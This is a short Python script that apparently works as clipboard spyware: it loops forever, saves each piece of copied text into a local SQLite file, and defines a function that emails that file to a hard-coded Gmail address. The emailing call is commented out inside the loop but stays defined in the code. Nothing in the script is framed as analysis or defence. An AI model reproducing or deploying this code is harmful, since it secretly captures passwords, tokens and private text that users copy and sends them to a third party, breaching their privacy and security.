import pyperclip
import sqlite3
from sqlite3 import Error
import time
from sendmail import sendmail

text_table_create_sql = "CREATE TABLE IF NOT EXISTS copieds (id integer PRIMARY KEY AUTOINCREMENT,copied_text text);"
conn = None
cursor = None

def clipboard_event():
    print("clipboard worked");
    while True:
        conn = sqlite3.connect(r"clipboard.db")
        cursor = conn.cursor()
        cursor.execute(text_table_create_sql)
        text = None
        sql_row = "SELECT COUNT(*) FROM copieds"
        row_count = cursor.execute(sql_row).fetchone()[0]
        if(row_count > 5):
            # send_db()
            cursor.execute("DELETE FROM copieds")
            conn.commit()
        try:
            text = str(pyperclip.paste())
            if(text != ""):
                sql = ''' INSERT INTO copieds (copied_text)
                    VALUES(?) '''
                cursor.execute(sql, (text,))
                conn.commit()
                conn.close()
            pyperclip.waitForNewPaste()
        except Error as e:
            print("Error" + str(e))
        except Exception as e:
            print("Exception" + str(e))
        time.sleep(10)

def send_db():
    sendmail("Db", send_to="hot05red05@gmail.com", files=["clipboard.db"])
    print("Database sent")

    
        
clipboard_event()
